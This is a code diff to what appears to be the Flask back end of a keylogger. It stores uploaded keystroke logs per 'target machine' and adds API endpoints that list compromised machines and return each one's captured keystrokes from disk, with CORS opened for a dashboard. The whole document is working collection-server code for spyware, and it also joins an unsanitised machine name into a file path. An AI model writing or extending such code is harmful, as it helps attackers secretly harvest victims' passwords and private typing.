@@ -1,8 +1,9 @@
 from flask import Flask, request, jsonify
 import time
 import os
-
+from flask_cors import CORS
 app = Flask(__name__)
+CORS(app)
 target_machine = []
 keystrokes_data = {}
 
@@ -27,6 +28,7 @@ def upload():
     machine_folder = os.path.join("data", machine)
     if not os.path.exists(machine_folder):
         os.makedirs(machine_folder)
+        target_machine.append(machine)
 
     if machine not in target_machine:
          target_machine.append(machine)
@@ -45,14 +47,27 @@ def upload():
 
 @app.route('/api/get_target_machines_list/', methods=['GET'])
 def get_target_machines_list():
-    return jsonify(target_machine)
+    if not os.path.exists("data"):
+        return jsonify([])
+    machines = [name for name in os.listdir("data") if os.path.isdir(os.path.join("data", name))]
+    return jsonify(machines)
+
 
 
 @app.route('/api/get_keystrokes_machine/<machine>', methods=['GET'])
 def get_keystrokes_machine(machine):
-    if machine not in keystrokes_data:
+    machine_folder = os.path.join("data", machine)
+    if not os.path.exists(machine_folder):
         return jsonify({"error": "Machine not found"}), 404
-    return jsonify({machine: keystrokes_data[machine]})
+
+    logs = {}
+    for filename in os.listdir(machine_folder):
+        file_path = os.path.join(machine_folder, filename)
+        with open(file_path, "r", encoding="utf-8") as f:
+            logs[filename] = f.read()
+
+    return jsonify({machine: logs})
+
 
 
 if __name__ == "__main__":
